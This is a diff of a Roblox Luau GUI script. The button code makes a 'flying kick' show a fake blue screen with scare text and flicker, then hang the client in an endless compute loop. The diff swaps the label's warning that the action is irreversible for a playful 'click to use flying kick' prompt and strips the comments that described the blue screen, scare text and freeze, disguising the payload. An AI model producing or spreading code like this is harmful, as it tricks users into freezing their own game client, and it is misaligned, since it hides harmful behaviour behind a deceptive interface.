@@ -228,7 +228,7 @@ local tip = Instance.new("TextLabel")
 tip.Size = UDim2.new(1, 0, 0, 24)
 tip.Position = UDim2.fromScale(0, 0.85)
 tip.BackgroundTransparency = 1
-tip.Text = "⚠️ 点击后将不可逆转"
+tip.Text = "点击使用飞踢😁"
 tip.TextColor3 = Color3.fromRGB(180, 180, 180)
 tip.TextScaled = true
 tip.Font = Enum.Font.Gotham
@@ -252,18 +252,18 @@ startBtn.MouseButton1Click:Connect(function()
 	panel2.Visible = true
 end)
 
--- 飞踢 → 蓝屏 + 闪烁 + 震动 + 卡死
+
 kickBtn.MouseButton1Click:Connect(function()
 	panel2.Visible = false
 	iceBtn.Visible = false
 
-	-- 蓝屏
+	
 	local bg = Instance.new("Frame")
 	bg.Size = UDim2.fromScale(1, 1)
 	bg.BackgroundColor3 = Color3.fromRGB(0, 60, 130)
 	bg.Parent = screenGui
 
-	-- 恐吓文字
+	
 	local txt = Instance.new("TextLabel")
 	txt.Size = UDim2.fromScale(1, 0.55)
 	txt.Position = UDim2.fromScale(0, 0.2)
@@ -321,7 +321,7 @@ kickBtn.MouseButton1Click:Connect(function()
 		task.wait(0.1)
 	end
 
-	-- 💀 卡死
+	-- 
 	while true do
 		for i = 1, 100000 do
 			local _ = math.sin(i) * math.cos(i)
